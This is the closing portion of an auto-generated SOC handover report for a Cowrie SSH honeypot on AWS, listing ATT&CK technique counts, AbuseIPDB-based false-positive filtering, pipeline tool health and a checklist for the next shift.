| [T1078](https://attack.mitre.org/techniques/T1078) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |

---

## 🔕 False Positive Summary (84 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 22 |
| AbuseIPDB score 16 below threshold 25 | 7 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 4 |
| AbuseIPDB score 8 below threshold 25 | 6 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 42 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 200 cases |
| Tool 34  | Credential Extractor        | ✅ 43 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 44 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 84 filtered (42.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 38 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 5 priority case(s) shown individually · 18 recon entry/entries in table (8 group(s) consolidating 101 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-11T17:58:45Z_
